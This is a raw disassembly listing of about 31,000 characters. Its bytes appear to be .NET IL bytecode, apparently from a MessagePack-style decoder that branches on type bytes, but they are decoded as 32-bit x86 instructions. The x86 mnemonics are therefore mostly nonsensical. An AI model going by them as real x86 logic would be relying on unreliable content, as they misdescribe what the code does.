  404c36:	26 00 00             	add    %al,%es:(%eax)
  404c39:	0a 0b                	or     (%ebx),%cl
  404c3b:	14 0c                	adc    $0xc,%al
  404c3d:	07                   	pop    %es
  404c3e:	8e 3a                	mov    (%edx),%?
  404c40:	02 00                	add    (%eax),%al
  404c42:	00 00                	add    %al,(%eax)
  404c44:	14 2a                	adc    $0x2a,%al
  404c46:	07                   	pop    %es
  404c47:	8e 69 17             	mov    0x17(%ecx),%gs
  404c4a:	3e 41                	ds inc %ecx
  404c4c:	00 00                	add    %al,(%eax)
  404c4e:	00 16                	add    %dl,(%esi)
  404c50:	0d 38 32 00 00       	or     $0x3238,%eax
  404c55:	00 07                	add    %al,(%edi)
  404c57:	09 a3 38 00 00 01    	or     %esp,0x1000038(%ebx)
  404c5d:	0c 06                	or     $0x6,%al
  404c5f:	08 6f 6e             	or     %ch,0x6e(%edi)
  404c62:	00 00                	add    %al,(%eax)
  404c64:	06                   	push   %es
  404c65:	13 04 11             	adc    (%ecx,%edx,1),%eax
  404c68:	04 3a                	add    $0x3a,%al
  404c6a:	13 00                	adc    (%eax),%eax
  404c6c:	00 00                	add    %al,(%eax)
  404c6e:	06                   	push   %es
  404c6f:	6f                   	outsl  %ds:(%esi),(%dx)
  404c70:	6f                   	outsl  %ds:(%esi),(%dx)
  404c71:	00 00                	add    %al,(%eax)
  404c73:	06                   	push   %es
  404c74:	0a 06                	or     (%esi),%al
  404c76:	08 6f 6a             	or     %ch,0x6a(%edi)
  404c79:	00 00                	add    %al,(%eax)
  404c7b:	06                   	push   %es
  404c7c:	38 03                	cmp    %al,(%ebx)
  404c7e:	00 00                	add    %al,(%eax)
  404c80:	00 11                	add    %dl,(%ecx)
  404c82:	04 0a                	add    $0xa,%al
  404c84:	09 17                	or     %edx,(%edi)
  404c86:	58                   	pop    %eax
  404c87:	0d 09 07 8e 69       	or     $0x698e0709,%eax
  404c8c:	17                   	pop    %ss
  404c8d:	59                   	pop    %ecx
  404c8e:	32 c6                	xor    %dh,%al
  404c90:	07                   	pop    %es
  404c91:	07                   	pop    %es
  404c92:	8e 69 17             	mov    0x17(%ecx),%gs
  404c95:	59                   	pop    %ecx
  404c96:	a3 38 00 00 01       	mov    %eax,0x1000038
  404c9b:	0c 06                	or     $0x6,%al
  404c9d:	08 6f 6d             	or     %ch,0x6d(%edi)
  404ca0:	00 00                	add    %al,(%eax)
  404ca2:	06                   	push   %es
  404ca3:	13 05 11 05 15 3e    	adc    0x3e150511,%eax
  404ca9:	0e                   	push   %cs
  404caa:	00 00                	add    %al,(%eax)
  404cac:	00 06                	add    %al,(%esi)
  404cae:	7b 38                	jnp    0x404ce8
  404cb0:	00 00                	add    %al,(%eax)
  404cb2:	04 11                	add    $0x11,%al
  404cb4:	05 6f ea 00 00       	add    $0xea6f,%eax
  404cb9:	0a 2a                	or     (%edx),%ch
  404cbb:	06                   	push   %es
  404cbc:	6f                   	outsl  %ds:(%esi),(%dx)
  404cbd:	6f                   	outsl  %ds:(%esi),(%dx)
  404cbe:	00 00                	add    %al,(%eax)
  404cc0:	06                   	push   %es
  404cc1:	0a 06                	or     (%esi),%al
  404cc3:	08 6f 6a             	or     %ch,0x6a(%edi)
  404cc6:	00 00                	add    %al,(%eax)
  404cc8:	06                   	push   %es
  404cc9:	06                   	push   %es
  404cca:	2a 00                	sub    (%eax),%al
  404ccc:	1b 30                	sbb    (%eax),%esi
  404cce:	04 00                	add    $0x0,%al
  404cd0:	3b 00                	cmp    (%eax),%eax
  404cd2:	00 00                	add    %al,(%eax)
  404cd4:	24 00                	and    $0x0,%al
  404cd6:	00 11                	add    %dl,(%ecx)
  404cd8:	73 d0                	jae    0x404caa
  404cda:	00 00                	add    %al,(%eax)
  404cdc:	0a 0a                	or     (%edx),%cl
  404cde:	03 28                	add    (%eax),%ebp
  404ce0:	a2 00 00 06 10       	mov    %al,0x10060000
  404ce5:	01 06                	add    %eax,(%esi)
  404ce7:	03 16                	add    (%esi),%edx
  404ce9:	03 8e 69 6f 4c 00    	add    0x4c6f69(%esi),%ecx
  404cef:	00 0a                	add    %cl,(%edx)
  404cf1:	06                   	push   %es
  404cf2:	16                   	push   %ss
  404cf3:	6a 6f                	push   $0x6f
  404cf5:	4e                   	dec    %esi
  404cf6:	00 00                	add    %al,(%eax)
  404cf8:	0a 02                	or     (%edx),%al
  404cfa:	06                   	push   %es
  404cfb:	28 88 00 00 06 dd    	sub    %cl,-0x22fa0000(%eax)
  404d01:	0d 00 00 00 06       	or     $0x6000000,%eax
  404d06:	39 06                	cmp    %eax,(%esi)
  404d08:	00 00                	add    %al,(%eax)
  404d0a:	00 06                	add    %al,(%esi)
  404d0c:	6f                   	outsl  %ds:(%esi),(%dx)
  404d0d:	33 00                	xor    (%eax),%eax
  404d0f:	00 0a                	add    %cl,(%edx)
  404d11:	dc 2a                	fsubrl (%edx)
  404d13:	00 01                	add    %al,(%ecx)
  404d15:	10 00                	adc    %al,(%eax)
  404d17:	00 02                	add    %al,(%edx)
  404d19:	00 06                	add    %al,(%esi)
  404d1b:	00 27                	add    %ah,(%edi)
  404d1d:	2d 00 0d 00 00       	sub    $0xd00,%eax
  404d22:	00 00                	add    %al,(%eax)
  404d24:	13 30                	adc    (%eax),%esi
  404d26:	02 00                	add    (%eax),%al
  404d28:	16                   	push   %ss
  404d29:	00 00                	add    %al,(%eax)
  404d2b:	00 25 00 00 11 03    	add    %ah,0x3110000
  404d31:	19 73 6c             	sbb    %esi,0x6c(%ebx)
  404d34:	00 00                	add    %al,(%eax)
  404d36:	0a 0a                	or     (%edx),%cl
  404d38:	02 06                	add    (%esi),%al
  404d3a:	28 88 00 00 06 06    	sub    %cl,0x6060000(%eax)
  404d40:	6f                   	outsl  %ds:(%esi),(%dx)
  404d41:	40                   	inc    %eax
  404d42:	00 00                	add    %al,(%eax)
  404d44:	0a 2a                	or     (%edx),%ch
  404d46:	00 00                	add    %al,(%eax)
  404d48:	13 30                	adc    (%eax),%esi
  404d4a:	04 00                	add    $0x0,%al
  404d4c:	07                   	pop    %es
  404d4d:	06                   	push   %es
  404d4e:	00 00                	add    %al,(%eax)
  404d50:	26 00 00             	add    %al,%es:(%eax)
  404d53:	11 03                	adc    %eax,(%ebx)
  404d55:	6f                   	outsl  %ds:(%esi),(%dx)
  404d56:	00 01                	add    %al,(%ecx)
  404d58:	00 0a                	add    %cl,(%edx)
  404d5a:	d2 0a                	rorb   %cl,(%edx)
  404d5c:	14 0b                	adc    $0xb,%al
  404d5e:	16                   	push   %ss
  404d5f:	0c 16                	or     $0x16,%al
  404d61:	0d 06 1f 7f 3d       	or     $0x3d7f1f06,%eax
  404d66:	09 00                	or     %eax,(%eax)
  404d68:	00 00                	add    %al,(%eax)
  404d6a:	02 06                	add    (%esi),%al
  404d6c:	6e                   	outsb  %ds:(%esi),(%dx)
  404d6d:	28 74 00 00          	sub    %dh,0x0(%eax,%eax,1)
  404d71:	06                   	push   %es
  404d72:	2a 06                	sub    (%esi),%al
  404d74:	20 80 00 00 00 3f    	and    %al,0x3f000000(%eax)
  404d7a:	48                   	dec    %eax
  404d7b:	00 00                	add    %al,(%eax)
  404d7d:	00 06                	add    %al,(%esi)
  404d7f:	20 8f 00 00 00 3d    	and    %cl,0x3d000000(%edi)
  404d85:	3d 00 00 00 02       	cmp    $0x2000000,%eax
  404d8a:	28 6b 00             	sub    %ch,0x0(%ebx)
  404d8d:	00 06                	add    %al,(%esi)
  404d8f:	02 18                	add    (%eax),%bl
  404d91:	7d 36                	jge    0x404dc9
  404d93:	00 00                	add    %al,(%eax)
  404d95:	04 06                	add    $0x6,%al
  404d97:	20 80 00 00 00 59    	and    %al,0x59000000(%eax)
  404d9d:	0c 16                	or     $0x16,%al
  404d9f:	0d 38 1c 00 00       	or     $0x1c38,%eax
  404da4:	00 02                	add    %al,(%edx)
  404da6:	28 6c 00 00          	sub    %ch,0x0(%eax,%eax,1)
  404daa:	06                   	push   %es
  404dab:	25 03 28 96 00       	and    $0x962803,%eax
  404db0:	00 06                	add    %al,(%esi)
  404db2:	6f                   	outsl  %ds:(%esi),(%dx)
  404db3:	6a 00                	push   $0x0
  404db5:	00 06                	add    %al,(%esi)
  404db7:	03 6f 88             	add    -0x78(%edi),%ebp
  404dba:	00 00                	add    %al,(%eax)
  404dbc:	06                   	push   %es
  404dbd:	09 17                	or     %edx,(%edi)
  404dbf:	58                   	pop    %eax
  404dc0:	0d 09 08 32 e0       	or     $0xe0320809,%eax
  404dc5:	2a 06                	sub    (%esi),%al
  404dc7:	20 90 00 00 00 3f    	and    %dl,0x3f000000(%eax)
  404dcd:	3c 00                	cmp    $0x0,%al
  404dcf:	00 00                	add    %al,(%eax)
  404dd1:	06                   	push   %es
  404dd2:	20 9f 00 00 00 3d    	and    %bl,0x3d000000(%edi)
  404dd8:	31 00                	xor    %eax,(%eax)
  404dda:	00 00                	add    %al,(%eax)
  404ddc:	02 28                	add    (%eax),%ch
  404dde:	6b 00 00             	imul   $0x0,(%eax),%eax
  404de1:	06                   	push   %es
  404de2:	02 19                	add    (%ecx),%bl
  404de4:	7d 36                	jge    0x404e1c
  404de6:	00 00                	add    %al,(%eax)
  404de8:	04 06                	add    $0x6,%al
  404dea:	20 90 00 00 00 59    	and    %dl,0x59000000(%eax)
  404df0:	0c 16                	or     $0x16,%al
  404df2:	0d 38 10 00 00       	or     $0x1038,%eax
  404df7:	00 02                	add    %al,(%edx)
  404df9:	28 6c 00 00          	sub    %ch,0x0(%eax,%eax,1)
  404dfd:	06                   	push   %es
  404dfe:	03 6f 88             	add    -0x78(%edi),%ebp
  404e01:	00 00                	add    %al,(%eax)
  404e03:	06                   	push   %es
  404e04:	09 17                	or     %edx,(%edi)
  404e06:	58                   	pop    %eax
  404e07:	0d 09 08 32 ec       	or     $0xec320809,%eax
  404e0c:	2a 06                	sub    (%esi),%al
  404e0e:	20 a0 00 00 00 3f    	and    %ah,0x3f000000(%eax)
  404e14:	21 00                	and    %eax,(%eax)
  404e16:	00 00                	add    %al,(%eax)
  404e18:	06                   	push   %es
  404e19:	20 bf 00 00 00 3d    	and    %bh,0x3d000000(%edi)
  404e1f:	16                   	push   %ss
  404e20:	00 00                	add    %al,(%eax)
  404e22:	00 06                	add    %al,(%esi)
  404e24:	20 a0 00 00 00 59    	and    %ah,0x59000000(%eax)
  404e2a:	0c 02                	or     $0x2,%al
  404e2c:	03 08                	add    (%eax),%ecx
  404e2e:	28 95 00 00 06 28    	sub    %dl,0x28060000(%ebp)
  404e34:	81 00 00 06 2a 06    	addl   $0x62a0600,(%eax)
  404e3a:	20 e0                	and    %ah,%al
  404e3c:	00 00                	add    %al,(%eax)
  404e3e:	00 3f                	add    %bh,(%edi)
  404e40:	15 00 00 00 06       	adc    $0x6000000,%eax
  404e45:	20 ff                	and    %bh,%bh
  404e47:	00 00                	add    %al,(%eax)
  404e49:	00 3d 0a 00 00 00    	add    %bh,0xa
  404e4f:	02 06                	add    (%esi),%al
  404e51:	67 6a 28             	addr16 push $0x28
  404e54:	74 00                	je     0x404e56
  404e56:	00 06                	add    %al,(%esi)
  404e58:	2a 06                	sub    (%esi),%al
  404e5a:	20 c0                	and    %al,%al
  404e5c:	00 00                	add    %al,(%eax)
  404e5e:	00 40 07             	add    %al,0x7(%eax)
  404e61:	00 00                	add    %al,(%eax)
  404e63:	00 02                	add    %al,(%edx)
  404e65:	28 80 00 00 06 2a    	sub    %al,0x2a060000(%eax)
  404e6b:	06                   	push   %es
  404e6c:	20 c1                	and    %al,%cl
  404e6e:	00 00                	add    %al,(%eax)
  404e70:	00 40 0b             	add    %al,0xb(%eax)
  404e73:	00 00                	add    %al,(%eax)
  404e75:	00 72 c2             	add    %dh,-0x3e(%edx)
  404e78:	27                   	daa
  404e79:	00 70 73             	add    %dh,0x73(%eax)
  404e7c:	01 01                	add    %eax,(%ecx)
  404e7e:	00 0a                	add    %cl,(%edx)
  404e80:	7a 06                	jp     0x404e88
  404e82:	20 c2                	and    %al,%dl
  404e84:	00 00                	add    %al,(%eax)
  404e86:	00 40 08             	add    %al,0x8(%eax)
  404e89:	00 00                	add    %al,(%eax)
  404e8b:	00 02                	add    %al,(%edx)
  404e8d:	16                   	push   %ss
  404e8e:	28 83 00 00 06 2a    	sub    %al,0x2a060000(%ebx)
  404e94:	06                   	push   %es
  404e95:	20 c3                	and    %al,%bl
  404e97:	00 00                	add    %al,(%eax)
  404e99:	00 40 08             	add    %al,0x8(%eax)
  404e9c:	00 00                	add    %al,(%eax)
  404e9e:	00 02                	add    %al,(%edx)
  404ea0:	17                   	pop    %ss
  404ea1:	28 83 00 00 06 2a    	sub    %al,0x2a060000(%ebx)
  404ea7:	06                   	push   %es
  404ea8:	20 c4                	and    %al,%ah
  404eaa:	00 00                	add    %al,(%eax)
  404eac:	00 40 20             	add    %al,0x20(%eax)
  404eaf:	00 00                	add    %al,(%eax)
  404eb1:	00 03                	add    %al,(%ebx)
  404eb3:	6f                   	outsl  %ds:(%esi),(%dx)
  404eb4:	00 01                	add    %al,(%ecx)
  404eb6:	00 0a                	add    %cl,(%edx)
  404eb8:	0c 08                	or     $0x8,%al
  404eba:	8d 44 00 00          	lea    0x0(%eax,%eax,1),%eax
  404ebe:	01 0b                	add    %ecx,(%ebx)
  404ec0:	03 07                	add    (%edi),%eax
  404ec2:	16                   	push   %ss
  404ec3:	08 6f 45             	or     %ch,0x45(%edi)
  404ec6:	00 00                	add    %al,(%eax)
  404ec8:	0a 26                	or     (%esi),%ah
  404eca:	02 07                	add    (%edi),%al
  404ecc:	28 79 00             	sub    %bh,0x0(%ecx)
  404ecf:	00 06                	add    %al,(%esi)
  404ed1:	2a 06                	sub    (%esi),%al
  404ed3:	20 c5                	and    %al,%ch
  404ed5:	00 00                	add    %al,(%eax)
  404ed7:	00 40 39             	add    %al,0x39(%eax)
  404eda:	00 00                	add    %al,(%eax)
  404edc:	00 18                	add    %bl,(%eax)
  404ede:	8d 44 00 00          	lea    0x0(%eax,%eax,1),%eax
  404ee2:	01 0b                	add    %ecx,(%ebx)
  404ee4:	03 07                	add    (%edi),%eax
  404ee6:	16                   	push   %ss
  404ee7:	18 6f 45             	sbb    %ch,0x45(%edi)
  404eea:	00 00                	add    %al,(%eax)
  404eec:	0a 26                	or     (%esi),%ah
  404eee:	07                   	pop    %es
  404eef:	28 58 00             	sub    %bl,0x0(%eax)
  404ef2:	00 06                	add    %al,(%esi)
  404ef4:	0b 07                	or     (%edi),%eax
  404ef6:	16                   	push   %ss
  404ef7:	28 02                	sub    %al,(%edx)
  404ef9:	01 00                	add    %eax,(%eax)
  404efb:	0a 0c 08             	or     (%eax,%ecx,1),%cl
  404efe:	8d 44 00 00          	lea    0x0(%eax,%eax,1),%eax
  404f02:	01 0b                	add    %ecx,(%ebx)
  404f04:	03 07                	add    (%edi),%eax
  404f06:	16                   	push   %ss
  404f07:	08 6f 45             	or     %ch,0x45(%edi)
  404f0a:	00 00                	add    %al,(%eax)
  404f0c:	0a 26                	or     (%esi),%ah
  404f0e:	02 07                	add    (%edi),%al
  404f10:	28 79 00             	sub    %bh,0x0(%ecx)
  404f13:	00 06                	add    %al,(%esi)
  404f15:	2a 06                	sub    (%esi),%al
  404f17:	20 c6                	and    %al,%dh
  404f19:	00 00                	add    %al,(%eax)
  404f1b:	00 40 39             	add    %al,0x39(%eax)
  404f1e:	00 00                	add    %al,(%eax)
  404f20:	00 1a                	add    %bl,(%edx)
  404f22:	8d 44 00 00          	lea    0x0(%eax,%eax,1),%eax
  404f26:	01 0b                	add    %ecx,(%ebx)
  404f28:	03 07                	add    (%edi),%eax
  404f2a:	16                   	push   %ss
  404f2b:	1a 6f 45             	sbb    0x45(%edi),%ch
  404f2e:	00 00                	add    %al,(%eax)
  404f30:	0a 26                	or     (%esi),%ah
  404f32:	07                   	pop    %es
  404f33:	28 58 00             	sub    %bl,0x0(%eax)
  404f36:	00 06                	add    %al,(%esi)
  404f38:	0b 07                	or     (%edi),%eax
  404f3a:	16                   	push   %ss
  404f3b:	28 44 00 00          	sub    %al,0x0(%eax,%eax,1)
  404f3f:	0a 0c 08             	or     (%eax,%ecx,1),%cl
  404f42:	8d 44 00 00          	lea    0x0(%eax,%eax,1),%eax
  404f46:	01 0b                	add    %ecx,(%ebx)
  404f48:	03 07                	add    (%edi),%eax
  404f4a:	16                   	push   %ss
  404f4b:	08 6f 45             	or     %ch,0x45(%edi)
  404f4e:	00 00                	add    %al,(%eax)
  404f50:	0a 26                	or     (%esi),%ah
  404f52:	02 07                	add    (%edi),%al
  404f54:	28 79 00             	sub    %bh,0x0(%ecx)
  404f57:	00 06                	add    %al,(%esi)
  404f59:	2a 06                	sub    (%esi),%al
  404f5b:	20 c7                	and    %al,%bh
  404f5d:	00 00                	add    %al,(%eax)
  404f5f:	00 3b                	add    %bh,(%ebx)
  404f61:	16                   	push   %ss
  404f62:	00 00                	add    %al,(%eax)
  404f64:	00 06                	add    %al,(%esi)
  404f66:	20 c8                	and    %cl,%al
  404f68:	00 00                	add    %al,(%eax)
  404f6a:	00 3b                	add    %bh,(%ebx)
  404f6c:	0b 00                	or     (%eax),%eax
  404f6e:	00 00                	add    %al,(%eax)
  404f70:	06                   	push   %es
  404f71:	20 c9                	and    %cl,%cl
  404f73:	00 00                	add    %al,(%eax)
  404f75:	00 40 0b             	add    %al,0xb(%eax)
  404f78:	00 00                	add    %al,(%eax)
  404f7a:	00 72 ee             	add    %dh,-0x12(%edx)
  404f7d:	27                   	daa
  404f7e:	00 70 73             	add    %dh,0x73(%eax)
  404f81:	01 01                	add    %eax,(%ecx)
  404f83:	00 0a                	add    %cl,(%edx)
  404f85:	7a 06                	jp     0x404f8d
  404f87:	20 ca                	and    %cl,%dl
  404f89:	00 00                	add    %al,(%eax)
  404f8b:	00 40 26             	add    %al,0x26(%eax)
  404f8e:	00 00                	add    %al,(%eax)
  404f90:	00 1a                	add    %bl,(%edx)
  404f92:	8d 44 00 00          	lea    0x0(%eax,%eax,1),%eax
  404f96:	01 0b                	add    %ecx,(%ebx)
  404f98:	03 07                	add    (%edi),%eax
  404f9a:	16                   	push   %ss
  404f9b:	1a 6f 45             	sbb    0x45(%edi),%ch
  404f9e:	00 00                	add    %al,(%eax)
  404fa0:	0a 26                	or     (%esi),%ah
  404fa2:	07                   	pop    %es
  404fa3:	28 58 00             	sub    %bl,0x0(%eax)
  404fa6:	00 06                	add    %al,(%esi)
  404fa8:	0b 02                	or     (%edx),%eax
  404faa:	07                   	pop    %es
  404fab:	16                   	push   %ss
  404fac:	28 03                	sub    %al,(%ebx)
  404fae:	01 00                	add    %eax,(%eax)
  404fb0:	0a 28                	or     (%eax),%ch
  404fb2:	84 00                	test   %al,(%eax)
  404fb4:	00 06                	add    %al,(%esi)
  404fb6:	2a 06                	sub    (%esi),%al
  404fb8:	20 cb                	and    %cl,%bl
  404fba:	00 00                	add    %al,(%eax)
  404fbc:	00 40 26             	add    %al,0x26(%eax)
  404fbf:	00 00                	add    %al,(%eax)
  404fc1:	00 1e                	add    %bl,(%esi)
  404fc3:	8d 44 00 00          	lea    0x0(%eax,%eax,1),%eax
  404fc7:	01 0b                	add    %ecx,(%ebx)
  404fc9:	03 07                	add    (%edi),%eax
  404fcb:	16                   	push   %ss
  404fcc:	1e                   	push   %ds
  404fcd:	6f                   	outsl  %ds:(%esi),(%dx)
  404fce:	45                   	inc    %ebp
  404fcf:	00 00                	add    %al,(%eax)
  404fd1:	0a 26                	or     (%esi),%ah
  404fd3:	07                   	pop    %es
  404fd4:	28 58 00             	sub    %bl,0x0(%eax)
  404fd7:	00 06                	add    %al,(%esi)
  404fd9:	0b 02                	or     (%edx),%eax
  404fdb:	07                   	pop    %es
  404fdc:	16                   	push   %ss
  404fdd:	28 04 01             	sub    %al,(%ecx,%eax,1)
  404fe0:	00 0a                	add    %cl,(%edx)
  404fe2:	28 85 00 00 06 2a    	sub    %al,0x2a060000(%ebp)
  404fe8:	06                   	push   %es
  404fe9:	20 cc                	and    %cl,%ah
  404feb:	00 00                	add    %al,(%eax)
  404fed:	00 40 11             	add    %al,0x11(%eax)
  404ff0:	00 00                	add    %al,(%eax)
  404ff2:	00 03                	add    %al,(%ebx)
  404ff4:	6f                   	outsl  %ds:(%esi),(%dx)
  404ff5:	00 01                	add    %al,(%ecx)
  404ff7:	00 0a                	add    %cl,(%edx)
  404ff9:	d2 0a                	rorb   %cl,(%edx)
  404ffb:	02 06                	add    (%esi),%al
  404ffd:	6e                   	outsb  %ds:(%esi),(%dx)
  404ffe:	28 74 00 00          	sub    %dh,0x0(%eax,%eax,1)
  405002:	06                   	push   %es
  405003:	2a 06                	sub    (%esi),%al
  405005:	20 cd                	and    %cl,%ch
  405007:	00 00                	add    %al,(%eax)
  405009:	00 40 27             	add    %al,0x27(%eax)
  40500c:	00 00                	add    %al,(%eax)
  40500e:	00 18                	add    %bl,(%eax)
  405010:	8d 44 00 00          	lea    0x0(%eax,%eax,1),%eax
  405014:	01 0b                	add    %ecx,(%ebx)
  405016:	03 07                	add    (%edi),%eax
  405018:	16                   	push   %ss
  405019:	18 6f 45             	sbb    %ch,0x45(%edi)
  40501c:	00 00                	add    %al,(%eax)
  40501e:	0a 26                	or     (%esi),%ah
  405020:	07                   	pop    %es
  405021:	28 58 00             	sub    %bl,0x0(%eax)
  405024:	00 06                	add    %al,(%esi)
  405026:	0b 02                	or     (%edx),%eax
  405028:	07                   	pop    %es
  405029:	16                   	push   %ss
  40502a:	28 02                	sub    %al,(%edx)
  40502c:	01 00                	add    %eax,(%eax)
  40502e:	0a 6e 28             	or     0x28(%esi),%ch
  405031:	74 00                	je     0x405033
  405033:	00 06                	add    %al,(%esi)
  405035:	2a 06                	sub    (%esi),%al
  405037:	20 ce                	and    %cl,%dh
  405039:	00 00                	add    %al,(%eax)
  40503b:	00 40 27             	add    %al,0x27(%eax)
  40503e:	00 00                	add    %al,(%eax)
  405040:	00 1a                	add    %bl,(%edx)
  405042:	8d 44 00 00          	lea    0x0(%eax,%eax,1),%eax
  405046:	01 0b                	add    %ecx,(%ebx)
  405048:	03 07                	add    (%edi),%eax
  40504a:	16                   	push   %ss
  40504b:	1a 6f 45             	sbb    0x45(%edi),%ch
  40504e:	00 00                	add    %al,(%eax)
  405050:	0a 26                	or     (%esi),%ah
  405052:	07                   	pop    %es
  405053:	28 58 00             	sub    %bl,0x0(%eax)
  405056:	00 06                	add    %al,(%esi)
  405058:	0b 02                	or     (%edx),%eax
  40505a:	07                   	pop    %es
  40505b:	16                   	push   %ss
  40505c:	28 05 01 00 0a 6e    	sub    %al,0x6e0a0001
  405062:	28 74 00 00          	sub    %dh,0x0(%eax,%eax,1)
  405066:	06                   	push   %es
  405067:	2a 06                	sub    (%esi),%al
  405069:	20 cf                	and    %cl,%bh
  40506b:	00 00                	add    %al,(%eax)
  40506d:	00 40 26             	add    %al,0x26(%eax)
  405070:	00 00                	add    %al,(%eax)
  405072:	00 1e                	add    %bl,(%esi)
  405074:	8d 44 00 00          	lea    0x0(%eax,%eax,1),%eax
  405078:	01 0b                	add    %ecx,(%ebx)
  40507a:	03 07                	add    (%edi),%eax
  40507c:	16                   	push   %ss
  40507d:	1e                   	push   %ds
  40507e:	6f                   	outsl  %ds:(%esi),(%dx)
  40507f:	45                   	inc    %ebp
  405080:	00 00                	add    %al,(%eax)
  405082:	0a 26                	or     (%esi),%ah
  405084:	07                   	pop    %es
  405085:	28 58 00             	sub    %bl,0x0(%eax)
  405088:	00 06                	add    %al,(%esi)
  40508a:	0b 02                	or     (%edx),%eax
  40508c:	07                   	pop    %es
  40508d:	16                   	push   %ss
  40508e:	28 06                	sub    %al,(%esi)
  405090:	01 00                	add    %eax,(%eax)
  405092:	0a 28                	or     (%eax),%ch
  405094:	75 00                	jne    0x405096
  405096:	00 06                	add    %al,(%esi)
  405098:	2a 06                	sub    (%esi),%al
  40509a:	20 dc                	and    %bl,%ah
  40509c:	00 00                	add    %al,(%eax)
  40509e:	00 40 49             	add    %al,0x49(%eax)
  4050a1:	00 00                	add    %al,(%eax)
  4050a3:	00 18                	add    %bl,(%eax)
  4050a5:	8d 44 00 00          	lea    0x0(%eax,%eax,1),%eax
  4050a9:	01 0b                	add    %ecx,(%ebx)
  4050ab:	03 07                	add    (%edi),%eax
  4050ad:	16                   	push   %ss
  4050ae:	18 6f 45             	sbb    %ch,0x45(%edi)
  4050b1:	00 00                	add    %al,(%eax)
  4050b3:	0a 26                	or     (%esi),%ah
  4050b5:	07                   	pop    %es
  4050b6:	28 58 00             	sub    %bl,0x0(%eax)
  4050b9:	00 06                	add    %al,(%esi)
  4050bb:	0b 07                	or     (%edi),%eax
  4050bd:	16                   	push   %ss
  4050be:	28 07                	sub    %al,(%edi)
  4050c0:	01 00                	add    %eax,(%eax)
  4050c2:	0a 0c 02             	or     (%edx,%eax,1),%cl
  4050c5:	28 6b 00             	sub    %ch,0x0(%ebx)
  4050c8:	00 06                	add    %al,(%esi)
  4050ca:	02 19                	add    (%ecx),%bl
  4050cc:	7d 36                	jge    0x405104
  4050ce:	00 00                	add    %al,(%eax)
  4050d0:	04 16                	add    $0x16,%al
  4050d2:	0d 38 10 00 00       	or     $0x1038,%eax
  4050d7:	00 02                	add    %al,(%edx)
  4050d9:	28 6c 00 00          	sub    %ch,0x0(%eax,%eax,1)
  4050dd:	06                   	push   %es
  4050de:	03 6f 88             	add    -0x78(%edi),%ebp
  4050e1:	00 00                	add    %al,(%eax)
  4050e3:	06                   	push   %es
  4050e4:	09 17                	or     %edx,(%edi)
  4050e6:	58                   	pop    %eax
  4050e7:	0d 09 08 32 ec       	or     $0xec320809,%eax
  4050ec:	2a 06                	sub    (%esi),%al
  4050ee:	20 dd                	and    %bl,%ch
  4050f0:	00 00                	add    %al,(%eax)
  4050f2:	00 40 49             	add    %al,0x49(%eax)
  4050f5:	00 00                	add    %al,(%eax)
  4050f7:	00 1a                	add    %bl,(%edx)
  4050f9:	8d 44 00 00          	lea    0x0(%eax,%eax,1),%eax
  4050fd:	01 0b                	add    %ecx,(%ebx)
  4050ff:	03 07                	add    (%edi),%eax
  405101:	16                   	push   %ss
  405102:	1a 6f 45             	sbb    0x45(%edi),%ch
  405105:	00 00                	add    %al,(%eax)
  405107:	0a 26                	or     (%esi),%ah
  405109:	07                   	pop    %es
  40510a:	28 58 00             	sub    %bl,0x0(%eax)
  40510d:	00 06                	add    %al,(%esi)
  40510f:	0b 07                	or     (%edi),%eax
  405111:	16                   	push   %ss
  405112:	28 07                	sub    %al,(%edi)
  405114:	01 00                	add    %eax,(%eax)
  405116:	0a 0c 02             	or     (%edx,%eax,1),%cl
  405119:	28 6b 00             	sub    %ch,0x0(%ebx)
  40511c:	00 06                	add    %al,(%esi)
  40511e:	02 19                	add    (%ecx),%bl
  405120:	7d 36                	jge    0x405158
  405122:	00 00                	add    %al,(%eax)
  405124:	04 16                	add    $0x16,%al
  405126:	0d 38 10 00 00       	or     $0x1038,%eax
  40512b:	00 02                	add    %al,(%edx)
  40512d:	28 6c 00 00          	sub    %ch,0x0(%eax,%eax,1)
  405131:	06                   	push   %es
  405132:	03 6f 88             	add    -0x78(%edi),%ebp
  405135:	00 00                	add    %al,(%eax)
  405137:	06                   	push   %es
  405138:	09 17                	or     %edx,(%edi)
  40513a:	58                   	pop    %eax
  40513b:	0d 09 08 32 ec       	or     $0xec320809,%eax
  405140:	2a 06                	sub    (%esi),%al
  405142:	20 d9                	and    %bl,%cl
  405144:	00 00                	add    %al,(%eax)
  405146:	00 40 0e             	add    %al,0xe(%eax)
  405149:	00 00                	add    %al,(%eax)
  40514b:	00 02                	add    %al,(%edx)
  40514d:	06                   	push   %es
  40514e:	03 28                	add    (%eax),%ebp
  405150:	97                   	xchg   %eax,%edi
  405151:	00 00                	add    %al,(%eax)
  405153:	06                   	push   %es
  405154:	28 81 00 00 06 2a    	sub    %al,0x2a060000(%ecx)
  40515a:	06                   	push   %es
  40515b:	20 de                	and    %bl,%dh
  40515d:	00 00                	add    %al,(%eax)
  40515f:	00 40 55             	add    %al,0x55(%eax)
  405162:	00 00                	add    %al,(%eax)
  405164:	00 18                	add    %bl,(%eax)
  405166:	8d 44 00 00          	lea    0x0(%eax,%eax,1),%eax
  40516a:	01 0b                	add    %ecx,(%ebx)
  40516c:	03 07                	add    (%edi),%eax
  40516e:	16                   	push   %ss
  40516f:	18 6f 45             	sbb    %ch,0x45(%edi)
  405172:	00 00                	add    %al,(%eax)
  405174:	0a 26                	or     (%esi),%ah
  405176:	07                   	pop    %es
  405177:	28 58 00             	sub    %bl,0x0(%eax)
  40517a:	00 06                	add    %al,(%esi)
  40517c:	0b 07                	or     (%edi),%eax
  40517e:	16                   	push   %ss
  40517f:	28 07                	sub    %al,(%edi)
  405181:	01 00                	add    %eax,(%eax)
  405183:	0a 0c 02             	or     (%edx,%eax,1),%cl
  405186:	28 6b 00             	sub    %ch,0x0(%ebx)
  405189:	00 06                	add    %al,(%esi)
  40518b:	02 18                	add    (%eax),%bl
  40518d:	7d 36                	jge    0x4051c5
  40518f:	00 00                	add    %al,(%eax)
  405191:	04 16                	add    $0x16,%al
  405193:	0d 38 1c 00 00       	or     $0x1c38,%eax
  405198:	00 02                	add    %al,(%edx)
  40519a:	28 6c 00 00          	sub    %ch,0x0(%eax,%eax,1)
  40519e:	06                   	push   %es
  40519f:	25 03 28 96 00       	and    $0x962803,%eax
  4051a4:	00 06                	add    %al,(%esi)
  4051a6:	6f                   	outsl  %ds:(%esi),(%dx)
  4051a7:	6a 00                	push   $0x0
  4051a9:	00 06                	add    %al,(%esi)
  4051ab:	03 6f 88             	add    -0x78(%edi),%ebp
  4051ae:	00 00                	add    %al,(%eax)
  4051b0:	06                   	push   %es
